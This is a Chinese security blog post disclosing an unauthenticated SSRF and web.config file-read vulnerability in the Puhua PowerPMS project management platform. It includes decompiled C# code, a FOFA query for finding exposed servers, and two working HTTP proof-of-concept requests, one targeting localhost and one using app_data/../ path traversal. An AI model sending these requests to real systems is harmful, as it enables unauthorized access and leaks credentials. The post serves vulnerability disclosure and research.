---
title: "普华Powerpms OfficeService.aspx SSRF+文件读取漏洞"
source: https://mrxn.net/jswz/powerpms-FormXml-DocFile-OfficeService-SSRF.html
asset_dir: assets/普华powerpms-officeservice.aspx-ssrf+文件读取漏洞
---

# 普华Powerpms OfficeService.aspx SSRF+文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/30 08:20
- 932浏览
- [0评论](#comment)
- 42分钟阅读

深入探索

软件

计算机安全

身份验证

---

# 漏洞简介

普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统OfficeService.aspx存在[SSRF](https://mrxn.net/tag/SSRF)（服务器端请求伪造）漏洞，未经身份验证的攻击者可能利用该漏洞访问系统资源或敏感信息，导致数据泄露或系统安全性降低，同时该接口还存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可利用该漏洞读取系统文件，造成敏感信息泄漏。

漏洞预警服务

# 影响版本

# fofa语法

> app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power\_login\_btn"
>
> 网络安全

# 漏洞分析

看下OfficeService.aspx的实现逻辑

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="OfficeService.aspx.cs" Inherits="Power.PMS.PowerPlat.FormXml.DocFile.OfficeService" %>
```

根据代码引用在Power.PMS.dll中找到PowerPlat.FormXml.DocFile.OfficeService的实现

文件大小转换

```
protected void Page_Load(object sender, EventArgs e)
{
  PowerGlobal.CheckSecurity(this.Request);
  iMsgServer2000 iMsgServer2000 = new iMsgServer2000();
  string str1 = this.Request["HumanId"];
  string sessionId = this.Request["sessionid"];
  string str2 = "2009";
  if (!string.IsNullOrEmpty(sessionId))
    str2 = PowerGlobal.GetConfigRunTimeValue("FtpConfig", "iWebOfficeVersion", PowerGlobal.getSession(sessionId));
  if (string.op_Equality(str2, "2009"))
  {
    MethodInfo methodInfo = Enumerable.FirstOrDefault<MethodInfo>((IEnumerable<MethodInfo>) iMsgServer2000.GetType().GetMethods(), (Func<MethodInfo, bool>) (m => string.op_Equality(((MemberInfo) m).Name, "Load")));
    if (MethodInfo.op_Inequality(methodInfo, (MethodInfo) null))
      ((MethodBase) methodInfo).Invoke((object) iMsgServer2000, new object[1]
      {
        (object) this.Request
      });
  }
  else
    iMsgServer2000.MsgVariant(this.Request.BinaryRead(this.Request.ContentLength));
  string msgByName1 = iMsgServer2000.GetMsgByName("RECORDID");
  string str3 = this.Request["action"];
  if (!string.IsNullOrEmpty(str3) && string.op_Equality(str3, "download"))
  {
    string weburl = this.Request["WEBURL"];
    string filename = "";
    if (!string.IsNullOrEmpty(weburl))
    {
      this.mFileBody = this.LoadFileStream(weburl, out filename);
    }
    else
    {
      if (string.IsNullOrEmpty(weburl))
        msgByName1 = this.Request.QueryString["mRecordID"];
      if (string.IsNullOrEmpty(weburl))
        msgByName1 = this.Request.QueryString["Id"];
      this.mFileBody = this.LoadFile(msgByName1, out filename);
    }
```

根据**action**参数的值进入不同的分支处理逻辑

漏洞预警服务

当**action=download**时，将**WEBURL**带入会进入**LoadFileStream**方法

```
public byte[] LoadFileStream(string weburl, out string filename)
{
  filename = DateTime.Now.ToString("yyyy-MM-dd");
  byte[] numArray = (byte[]) null;
  if (weburl.ToLower().IndexOf("app_data/") > -1)
  {
    if (weburl.ToLower().StartsWith("app_data/"))
      weburl = "~/" + weburl;
    if (weburl.ToLower().StartsWith("/app_data/"))
      weburl = "~" + weburl;
    string str = this.Server.MapPath(weburl);
    filename = Path.GetFileName(str);
    try
    {
      numArray = File.ReadAllBytes(str);
    }
    catch (Exception ex)
    {
      numArray = (byte[]) null;
    }
  }
  else
  {
    string str1 = "ASP.NET_SessionId";
    string str2 = $"{str1}={HttpContext.Current.Request.Cookies[str1].Value}";
    string str3 = this.Request.Url.Host;
    if (!this.Request.Url.IsDefaultPort)
      str3 = $"{this.Request.Url.Host}:{this.Request.Url.Port.ToString()}";
    string str4 = "http://" + str3;
    if (!weburl.ToLower().StartsWith("http://"))
      weburl = str4 + weburl;
    using (WebClient webClient = new WebClient())
    {
      ((NameValueCollection) webClient.Headers).Add("Cookie", str2);
      ((NameValueCollection) webClient.Headers)["User-Agent"] = HttpContext.Current.Request.UserAgent;
      try
      {
        numArray = webClient.DownloadData(weburl);
      }
      catch (Exception ex)
      {
        numArray = (byte[]) null;
      }
    }
  }
  return numArray;
}
```

对**weburl**进行系列处理，**如添加协议头或者以/app\_data/开头的直接进行[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)**。

# 漏洞复现

## SSRF

```
POST /PowerPlat/FormXml/DocFile/OfficeService.aspx HTTP/1.1
Host: powerpms.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=download&WEBURL=http://127.1
```

[![普华Powerpms OfficeService.aspx SSRF+文件读取漏洞](images/img-001-157b2f82068f.webp)](https://image.mrxn.net/3c3c50ff431b489db894284351128bf2.webp)

成功获取到本地80端口的web服务，根据title的特征，在网络空间测绘平台可知其为火绒终端部署系统

漏洞预警服务

[![普华Powerpms OfficeService.aspx SSRF+文件读取漏洞](images/img-002-5ce0057b2020.webp)](https://image.mrxn.net/f2ae223ac2e44ac3b61aaba981d22bb3.webp)

## 文件读取

```
POST /PowerPlat/FormXml/DocFile/OfficeService.aspx HTTP/1.1
Host: powerpms.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=download&WEBURL=app_data/../web.config
```

[![普华Powerpms OfficeService.aspx SSRF+文件读取漏洞](images/img-003-4ce14eda89d0.webp)](https://image.mrxn.net/f2164e39d5d84726b96cb756f18b2989.webp)

成功读取到 web.config 文件内容

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
- [#asp.net](https://mrxn.net/tag/asp.net)
- [#SSRF](https://mrxn.net/tag/SSRF)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.SSRF](#toc-5-1-)
- [5.2.文件读取](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
